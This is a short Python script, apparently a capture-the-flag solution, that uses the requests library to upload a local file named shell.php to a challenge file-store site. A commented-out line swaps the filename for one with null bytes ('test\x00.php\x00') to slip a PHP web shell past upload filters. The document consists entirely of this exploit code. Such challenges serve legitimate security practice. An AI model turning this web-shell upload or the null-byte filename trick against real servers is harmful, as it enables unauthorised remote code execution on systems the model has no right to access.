import requests

files = {
    "f":open("shell.php")
}

url = "https://filestore.web.actf.co/"

req = requests.Request("POST", url, files=files).prepare()

# req.body = req.body.replace(b"test.txt", b"test\x00.php\x00")

s = requests.Session()

p = s.send(req)

print(p.text)